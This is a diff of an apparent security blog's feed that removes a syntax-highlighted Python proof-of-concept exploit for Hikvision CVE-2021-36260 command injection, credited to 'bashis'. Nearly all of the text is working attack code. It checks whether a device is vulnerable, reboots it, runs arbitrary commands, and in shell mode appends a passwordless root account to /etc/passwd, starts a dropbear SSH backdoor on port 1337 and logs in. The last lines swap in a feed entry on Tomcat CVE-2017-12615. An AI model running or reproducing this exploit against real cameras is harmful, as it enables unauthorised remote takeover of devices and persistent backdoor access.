-    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="p">):</span>
-        <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">+</span> <span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
-    <span class="sh">"""</span><span class="s">
-    status_code == 200 (OK);
-        Verified vulnerable and exploitable
-    status_code == 500 (Internal Server Error);
-        Device may be vulnerable, but most likely not
-        The SDK webLanguage tag is there, but generate status_code 500 when language not found
-        I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500)
-        (Issue: Could also be other directory than </span><span class="sh">'</span><span class="s">webLib</span><span class="sh">'</span><span class="s">, r/o FS etc...)
-    status_code == 401 (Unauthorized);
-        Defiantly not vulnerable
-    </span><span class="sh">"""</span>
-    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">noverify</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Not verifying remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
-        <span class="k">return</span> <span class="bp">True</span>
-
-    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Checking remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
-
-    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[-] Cannot establish connection to </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
-        <span class="k">return</span> <span class="bp">None</span>
-    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[i] ETag:</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">ETag</span><span class="sh">'</span><span class="p">))</span>
-
-    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">&gt;webLib/c</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[-] </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"</span><span class="s"> do not looks like Hikvision</span><span class="sh">'</span><span class="p">)</span>
-        <span class="k">return</span> <span class="bp">False</span>
-    <span class="n">status_code</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span>
-
-    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/c</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-        <span class="sh">"""</span><span class="s">We could not verify command injection</span><span class="sh">"""</span>
-        <span class="k">if</span> <span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
-            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[-] Could not verify if vulnerable (Code: </span><span class="si">{</span><span class="n">status_code</span><span class="si">}</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
-            <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">reboot</span><span class="p">:</span>
-                <span class="k">return</span> <span class="nf">check_reboot</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[+] Remote is not vulnerable (Code: </span><span class="si">{</span><span class="n">status_code</span><span class="si">}</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
-        <span class="k">return</span> <span class="bp">False</span>
-
-    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[!] Remote is verified exploitable</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">return</span> <span class="bp">True</span>
-
-
-<span class="k">def</span> <span class="nf">check_reboot</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
-    <span class="sh">"""</span><span class="s">
-    We sending </span><span class="sh">'</span><span class="s">reboot</span><span class="sh">'</span><span class="s">, wait 2 sec, then checking with GET request.
-    - if there is data returned, we can assume remote is not vulnerable.
-    - If there is no connection or data returned, we can assume remote is vulnerable.
-    </span><span class="sh">"""</span>
-    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[i] Checking if vulnerable with </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"'</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Checking remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"</span><span class="s"> with </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"'</span><span class="p">)</span>
-    <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">reboot</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[!] Remote is vulnerable</span><span class="sh">'</span><span class="p">)</span>
-        <span class="k">return</span> <span class="bp">True</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Remote is not vulnerable</span><span class="sh">'</span><span class="p">)</span>
-        <span class="k">return</span> <span class="bp">False</span>
-
-
-<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
-        <span class="k">return</span> <span class="bp">False</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd</span><span class="si">}</span><span class="s">&gt;webLib/x</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
-        <span class="k">return</span> <span class="bp">False</span>
-
-    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/x</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[!] Error execute cmd </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
-        <span class="k">return</span> <span class="bp">False</span>
-    <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
-    <span class="k">return</span> <span class="bp">True</span>
-
-
-<span class="k">def</span> <span class="nf">cmd_blind</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
-    <span class="sh">"""</span><span class="s">
-    Blind command injection
-    </span><span class="sh">"""</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
-        <span class="k">return</span> <span class="bp">False</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd_blind</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[-] Error execute cmd </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd_blind</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
-        <span class="k">return</span> <span class="bp">False</span>
-    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[i] Try execute blind cmd </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd_blind</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
-    <span class="k">return</span> <span class="bp">True</span>
-
-
-<span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
-        <span class="k">return</span> <span class="bp">False</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/N</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[i] Remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="sh">"</span><span class="s"> not pwned, pwning now!</span><span class="sh">'</span><span class="p">)</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">echo -n P::0:0:W&gt;N</span><span class="sh">'</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">401</span><span class="p">:</span>
-            <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
-            <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
-            <span class="k">return</span> <span class="bp">False</span>
-        <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">echo :/:/bin/sh&gt;&gt;N</span><span class="sh">'</span><span class="p">)</span>
-        <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">cat N&gt;&gt;/etc/passwd</span><span class="sh">'</span><span class="p">)</span>
-        <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">dropbear -R -B -p 1337</span><span class="sh">'</span><span class="p">)</span>
-        <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">cat N&gt;webLib/N</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[i] Remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="sh">"</span><span class="s"> already pwned</span><span class="sh">'</span><span class="p">)</span>
-
-    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Trying SSH to </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s"> on port 1337</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">stty echo; stty iexten; stty icanon; </span><span class="se">\
-</span><span class="s">    ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null </span><span class="se">\
-</span><span class="s">    P@</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s"> -p 1337</span><span class="sh">'</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Hikvision CVE-2021-36260</span><span class="se">\n</span><span class="s">[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)</span><span class="sh">'</span><span class="p">)</span>
-
-    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">()</span>
-    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--rhost</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Remote Target Address (IP/FQDN)</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--rport</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Remote Target Port</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--check</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="sh">'</span><span class="s">store_true</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Check if vulnerable</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--reboot</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="sh">'</span><span class="s">store_true</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Reboot if vulnerable</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--shell</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="sh">'</span><span class="s">store_true</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Launch SSH shell</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--cmd</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">execute cmd (i.e: </span><span class="sh">"</span><span class="s">ls -l</span><span class="sh">"</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--cmd_blind</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">execute blind cmd (i.e: </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span>
-        <span class="sh">'</span><span class="s">--noverify</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="sh">'</span><span class="s">store_true</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Do not verify if vulnerable</span><span class="sh">'</span>
-    <span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span>
-        <span class="sh">'</span><span class="s">--proto</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">],</span> <span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Protocol used</span><span class="sh">'</span>
-    <span class="p">)</span>
-    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
-
-    <span class="n">remote</span> <span class="o">=</span> <span class="nc">Http</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">proto</span><span class="p">)</span>
-
-    <span class="k">try</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">shell</span><span class="p">:</span>
-            <span class="nf">shell</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
-        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">cmd</span><span class="p">:</span>
-            <span class="nf">cmd</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
-        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">cmd_blind</span><span class="p">:</span>
-            <span class="nf">cmd_blind</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
-        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">:</span>
-            <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
-        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">reboot</span><span class="p">:</span>
-            <span class="nf">check_reboot</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">([</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">])</span>
-    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
-        <span class="k">return</span> <span class="bp">False</span>
-
-
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
-    <span class="nf">main</span><span class="p">()</span>
-</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="hikvision" /><category term="unserialize" /><summary type="html"><![CDATA[body=”laCurrentLanguage” &amp;&amp; country=”CN”]]></summary></entry></feed>
+</ul>]]></content><author><name>yueyejian</name></author><category term="[&quot;vul&quot;]" /><category term="tomcat" /><category term="web" /><summary type="html"><![CDATA[CVE-2017-12615 - Tomcat任意文件写入 环境搭建 用vulhub的环境]]></summary></entry></feed>
